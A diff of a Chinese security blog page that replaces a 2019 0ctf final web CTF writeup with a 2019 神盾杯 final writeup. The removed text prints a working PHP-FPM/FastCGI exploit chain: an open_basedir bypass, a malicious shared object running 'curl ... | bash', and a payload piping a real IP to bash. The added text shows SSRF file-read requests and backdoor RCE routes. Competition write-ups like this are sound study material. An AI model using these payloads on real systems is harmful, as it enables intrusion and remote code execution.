@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>2019 0ctf final Web Writeup（1） · Sky&#39;s blog</title>
+    <title>2019 神盾杯 final Writeup（2） · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">2019 0ctf final Web Writeup（1）</a>
+                <a href="#" class="post-name">2019 神盾杯 final Writeup（2）</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            2019 0ctf final Web Writeup（1）
+            2019 神盾杯 final Writeup（2）
             <!-- 404 -->
             
         </h1>
@@ -272,12 +272,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,415</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">768</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/06/10</span>
+                    <span class="post-intro-time">2019/07/04</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,23 +401,20 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鸽了好久的Blog，因为自己事务缠身，一直没时间写一下最近比赛的题解，趁近日有空，来填坑~<br>第一次参加0ctf新星赛就拿了冠军，还是非常开心的。比赛过程中，web共4道题，我有幸做出3道，java实在不太擅长，哭了（，另一道是ocaml的题目，涉及小trick和逻辑问题，准备放在后面和java一起编写（希望不要咕咕咕了）。这里写出另外两道题目的题解如下：</p>
-<h2 id="114514-calcalcalc"><a href="#114514-calcalcalc" class="headerlink" title="114514_calcalcalc"></a>114514_calcalcalc</h2><p>本题是2019 RCTF calcalcalc的改版，这次限制了之前的时间延迟注入的问题，同时需要Bypass validator：<img src="/images/2019-07-02-20-41-31.png" alt=""><br>我们可以使用<code>__proto__</code>来进行Bypass：<br><img src="/images/2019-07-02-20-42-54.png" alt=""><br>至于时间注入的问题，我们可以使用bool注入来解决这个问题：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>: &#123;&#125;, <span class="string">"isVip"</span>: true, <span class="string">"expression"</span>: <span class="string">"1//1 and ord(open('/flag').read()[1]) &gt;-1 and 1\n"</span>&#125;</span><br></pre></td></tr></table></figure></p>
-<p>php下：<br><img src="/images/2019-07-02-20-33-27.png" alt=""><br>nodejs下：<br><img src="/images/2019-07-02-20-34-37.png" alt=""><br>python下：<br><img src="/images/2019-07-02-20-34-48.png" alt=""><br>当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>成立时，python返回1，与另外两个保持一致。当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>不成立时，返回<code>That&#39;s classified information. - Asahina Mikuru</code>。故此可以进行bool注入：<br><img src="/images/2019-07-02-16-12-39.png" alt=""></p>
-<h2 id="wallbreaker-not-very-hard"><a href="#wallbreaker-not-very-hard" class="headerlink" title="wallbreaker_not_very_hard"></a>wallbreaker_not_very_hard</h2><p>本题是2019 0ctf online和2019 *CTF的难度提升题，拿到题目较为明显的2个条件：<br>首先是disable_function，过滤了如下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall B: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log</span><br></pre></td></tr></table></figure></p>
-<p>然后是open_basedir限制了如下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall C: /var/www/html:/tmp</span><br></pre></td></tr></table></figure></p>
-<p>题目提示我们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Here&apos;s a backdoor, to help you break Wall A.</span><br><span class="line">But you should find the key of the backdoor.</span><br></pre></td></tr></table></figure></p>
-<p>于是进行目录爆破，得到如下文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10001/.index.php.swp</span><br></pre></td></tr></table></figure></p>
-<p>打开后发现后门:<br><img src="/images/2019-07-01-22-24-13.png" alt=""><br>这里很自然想到*CTF的解法：<br><a href="https://github.com/sixstars/starctf2019/tree/master/web-echohub" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/web-echohub</a><br>那么既然需要使用<code>stream_socket_client</code>和<code>stream_socket_sendto</code>连接php-fpm服务，那么我们需要知道<code>unix:///run/php/php7.3-fpm.sock</code>文件名，那么肯定需要Bypass open_basedir。<br>这里容易想到之前的相关poc，参考链接如下：<br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a><br>尝试构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sky'</span>);</span><br><span class="line">chdir(<span class="string">'sky'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">var_dump(glob(<span class="string">'*'</span>));</span><br></pre></td></tr></table></figure></p>
-<p>发现可以成功bypass open_basedir<br><img src="/images/2019-07-01-22-43-21.png" alt=""><br>通过列目录，可找到文件名如下：<br><img src="/images/2019-07-01-22-48-35.png" alt=""><br>但尝试使用<code>/var/run/php/U_wi11_nev3r_kn0w.sock</code>，并使用*ctf exp时，发现依然会被disable function限制，那么显然我们还得继续bypass disable function。<br>那么自然容易想到寻找引入拓展的地方，引入一个hack.so文件，hook函数，达到RCE的目的，这一点和之前2019 0ctf online的时候非常相似，这是当时已经给了现成的拓展和可用函数。<br>这里可以参考ph牛的文章：<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br>在文章中，ph牛剖析的非常透彻，可以帮助我们理解PHP-FPM未授权访问漏洞，既然知道了我们需要构造fastcgi协议和fpm进行通信。<br>那么势必需要找到fastcgi中是否有更改disable_functions的选项，或者引入extension的选项。同时利用auto_prepend_file和auto_append_file让php执行任意代码。并且文中提及，PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。但disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中。<br><img src="/images/2019-07-02-13-08-58.png" alt=""><br>所以思路更加明确了，我们应该是要找到PHP_ADMIN_VALUE的某个选项，可以帮助我们引入extension。<br>搜索易得,我们可以利用如下方式，引入指定位置的so文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_ADMIN_VALUE[&apos;extension&apos;] = /tmp/sky.so</span><br></pre></td></tr></table></figure></p>
-<p> 这里我们改写ph牛提供的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2019-07-02-13-19-29.png" alt=""><br>可以构造出如下exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%01%01%F8%F1%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F8%F1%01%DC%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F8%F1%00%00%00%00%01%05%F8%F1%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%F8%F1%00%00%00%00</span><br></pre></td></tr></table></figure></p>
-<p>但在使用之前，我们需要首先在/tmp目录下上传一个恶意so文件，我们利用如下github项目进行构造：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl xxxx | bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>然后编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure></p>
-<p>接着将sky.so进行上传<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$upload = <span class="string">'/tmp/sky.so'</span>;</span><br><span class="line"><span class="keyword">echo</span> copy(<span class="string">"http://vps_ip/sky.so"</span>, $upload);</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2019-07-02-15-14-44.png" alt=""><br>最后我们整合上述exp，给出完整Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = stream_socket_client(&quot;/var/run/php/U_wi11_nev3r_kn0w.sock&quot;, $errno, $errstr,30);$out = urldecode(&quot;%01%01%1C%AE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1C%AE%01%DC%00%00%0E%02CONTENT_LENGTH51%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%1C%AE%00%00%00%00%01%05%1C%AE%003%00%00%3C%3Fphp%20hello_world%28%27curl%20106.14.114.127%20%7C%20bash%27%29%3B%20%3F%3E%01%05%1C%AE%00%00%00%00&quot;);stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//&apos;</span><br></pre></td></tr></table></figure></p>
-<p>即可getshell</p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接之前的分析文章，本篇文章将2019 神盾杯线下赛后续两道web题也解析一下。</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="预置后门扫描"><a href="#预置后门扫描" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流cms typecho，先上工具扫一波：<br><img src="/images/2019-07-04-14-02-34.png" alt=""><br><img src="/images/2019-07-04-14-03-13.png" alt=""><br><img src="/images/2019-07-04-14-04-21.png" alt=""><br>同时注意到版本号：<br><img src="/images/2019-07-04-14-33-44.png" alt=""><br>根据github的开源项目回滚到当前版本：<br><img src="/images/2019-07-04-14-39-31.png" alt=""><br>并进行diff：<br><img src="/images/2019-07-04-14-55-48.png" alt=""></p>
+<h3 id="用户名RCE"><a href="#用户名RCE" class="headerlink" title="用户名RCE"></a>用户名RCE</h3><p><img src="/images/2019-07-04-14-55-33.png" alt=""><br>容易发现/admin/login.php处，$rememberName被反引号包裹，可以进行RCE。</p>
+<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>/var/Widget/XmlRpc.php：<br><img src="/images/2019-07-04-14-59-56.png" alt=""><br>该漏洞应该为typecho对应版本的原生漏洞，可以搜到相关信息：<br><img src="/images/2019-07-04-15-03-01.png" alt=""><br>那么关键点就在于过滤时，未把file协议过滤掉：<br>/var/Typecho/Http/Client/Adapter.php：<br><img src="/images/2019-07-04-15-00-29.png" alt=""><br>导致我们可以利用其进行SSRF任意文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;https://skysec.top/action/xmlrpc&quot; -d &apos;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;file:///flag&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;joychou&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&apos;</span><br></pre></td></tr></table></figure></p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><h3 id="预置后门扫描-1"><a href="#预置后门扫描-1" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流框架 thinkphp，先上工具扫一波：<br><img src="/images/2019-07-04-14-05-59.png" alt=""><br><img src="/images/2019-07-04-14-05-27.png" alt=""><br><img src="/images/2019-07-04-14-05-04.png" alt=""><br>比较遗憾，这里后门因为隐藏非常隐蔽，所以主流静态分析工具并没有很好的识别出webshell。下面还是得靠我们自己diff。<br>该项目是开源项目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/liaow/JuBiWang/tree/master</span><br></pre></td></tr></table></figure></p>
+<h3 id="thinkphp缓存机制"><a href="#thinkphp缓存机制" class="headerlink" title="thinkphp缓存机制"></a>thinkphp缓存机制</h3><p><img src="/images/2019-07-04-15-19-29.png" alt=""><br>关于thinkphp的缓存机制，是一个老生常谈的问题，在今年强网杯final中也有相应的问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2019/06/16/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFfinal-Web-Writeup/</span><br></pre></td></tr></table></figure></p>
+<p>这里就不再赘述了。</p>
+<h3 id="全局过滤器后门"><a href="#全局过滤器后门" class="headerlink" title="全局过滤器后门"></a>全局过滤器后门</h3><p>通过diff发现在文件/ThinkPHP/Common/functions.php:<br><img src="/images/2019-07-04-15-22-45.png" alt=""><br>其中出题人自己编写了一个全局函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MY_I</span><span class="params">($name,$default=<span class="string">''</span>,$filter=null,$datas=null)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>我们和框架自带的I函数做个比较：<br><img src="/images/2019-07-05-13-36-15.png" alt=""><br>发现出题人使用了自己的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MY_DEFAULT_FILTER</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进一下：<br><img src="/images/2019-07-05-13-37-10.png" alt=""><br>发现内置内门assert，那么我们寻找调用MY_I函数的位置：<br>/Application/Home/Controller/ChartController.class.php：<br><img src="/images/2019-07-04-15-28-52.png" alt=""><br>发现方法getMarketOrdinaryJson()使用了该函数，那么可以构造如下路由进行RCE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/chart/getMarketOrdinaryJson&amp;sky=phpinfo();</span><br></pre></td></tr></table></figure></p>
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>通过diff，发现在文件/Application/Admin/Controller/AdminController.class.php中多了如下方法：<br><img src="/images/2019-07-04-15-26-52.png" alt=""><br>简单看一下发现是curl，那么可以直接进行ssrf文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/admin/admin/callOnce&amp;url=file:///flag;</span><br></pre></td></tr></table></figure></p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>通过diff，发现在文件/Application/Home/Controller/IndexController.class.php中有如下flag方法：<br><img src="/images/2019-07-04-15-29-49.png" alt=""><br>我们发现只要我们输入的len和flag长度不一致，就会触发debug函数，我们跟进debug函数：<br><img src="/images/2019-07-05-13-53-40.png" alt=""><br>继续跟进log函数：<br><img src="/images/2019-07-05-13-53-51.png" alt=""><br>再跟进fb函数：<br><img src="/images/2019-07-05-13-57-01.png" alt=""><br><img src="/images/2019-07-05-13-56-51.png" alt=""><br>发现最后会进行setHeader，我们的debug信息会在http header中打印出来，那么即可通过这个方式获取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/index/flag&amp;len=1</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2019 神盾杯线下赛的4道web分析到此结束，总的来说diff还是比较强力的，最后的web4也不错，洞藏的都比较好一些，是和框架相互结合的，而不是生硬嵌入的，希望借此可以提高代码审计能力。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19038.html</span><br></pre></td></tr></table></figure>
     </article>
     <!-- reward  -->
     <div style='text-align:center;margin:100px auto auto auto;'>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
@@ -429,17 +426,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/06/16/2019-强网杯final-Web-Writeup/" title= "2019 强网杯final Web Writeup">
-                    <div class="nextTitle">2019 强网杯final Web Writeup</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/05/25/2019-强网杯online-Web-Writeup/" title= "2019 强网杯online Web Writeup">
-                    <div class="prevTitle">2019 强网杯online Web Writeup</div>
+                <a href= "/2019/07/03/2019 神盾杯 final Writeup（1）/" title= "2019 神盾杯 final Writeup（1）">
+                    <div class="prevTitle">2019 神盾杯 final Writeup（1）</div>
                 </a>
             
         </li>
@@ -561,7 +553,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#114514-calcalcalc"><span class="toc-number">2.</span> <span class="toc-text">114514_calcalcalc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wallbreaker-not-very-hard"><span class="toc-number">3.</span> <span class="toc-text">wallbreaker_not_very_hard</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">2.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预置后门扫描"><span class="toc-number">2.1.</span> <span class="toc-text">预置后门扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用户名RCE"><span class="toc-number">2.2.</span> <span class="toc-text">用户名RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">SSRF漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">3.</span> <span class="toc-text">web4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预置后门扫描-1"><span class="toc-number">3.1.</span> <span class="toc-text">预置后门扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp缓存机制"><span class="toc-number">3.2.</span> <span class="toc-text">thinkphp缓存机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#全局过滤器后门"><span class="toc-number">3.3.</span> <span class="toc-text">全局过滤器后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf"><span class="toc-number">3.4.</span> <span class="toc-text">ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件读取"><span class="toc-number">3.5.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3810,9 +3802,81 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 186
+        Total : 188
         </div>
         <!-- search  -->
         
@@ -3828,12 +3892,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2019/07/04/2019-神盾杯-final-Writeup（2）/" >2019 神盾杯 final Writeup（2）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2019/07/03/2019 神盾杯 final Writeup（1）/" >2019 神盾杯 final Writeup（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2019/06/16/2019-强网杯final-Web-Writeup/" >2019 强网杯final Web Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2019/06/10/2019-0ctf-final-Web-Writeup/" >2019 0ctf final Web Writeup（1）</a>
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2019/06/10/2019 0ctf final Web Writeup（1）/" >2019 0ctf final Web Writeup（1）</a>
         </li>
     
     
@@ -3888,12 +3962,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
         </li>
     
     
@@ -4436,12 +4510,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计一之维吉尼亚唯密文破解/" >密码学课程设计一之维吉尼亚唯密文破解</a>
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计二之手撸DES加解密程序/" >密码学课程设计二之手撸DES加解密程序</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计二之手撸DES加解密程序/" >密码学课程设计二之手撸DES加解密程序</a>
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计一之维吉尼亚唯密文破解/" >密码学课程设计一之维吉尼亚唯密文破解</a>
         </li>
     
     
@@ -4785,25 +4859,23 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
+        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
+    
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
         <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
     
-        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
+        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
+        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
+        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
         <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
     
         <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
     
@@ -4819,9 +4891,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
